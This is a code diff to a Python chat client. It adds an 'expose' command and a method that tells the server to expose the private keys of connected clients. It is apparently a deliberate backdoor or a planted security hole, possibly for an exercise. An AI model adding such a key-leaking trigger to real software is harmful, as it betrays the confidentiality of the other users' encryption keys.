@@ -268,6 +268,8 @@ class Client:
                 client = await aioconsole.ainput("Enter name of client to kick: ")
                 reason = await aioconsole.ainput("Enter reason for booting: ")
                 await self.kick_client(client, reason)
+            elif message.lower() == "expose":
+                await self.send_expose_to_server()
             else:
                 print("Invalid command.")
                 
@@ -733,6 +735,17 @@ class Client:
                 
         else:
             pass
+    
+    async def send_expose_to_server(self):
+        """
+        Send expose command to the server to expose connected client's private keys
+        """
+        message = {
+            "type": "expose"
+        }
+        
+        message_json = json.dumps(message)
+        await self.send(message_json)
            
     async def send(self, message_json):
         """
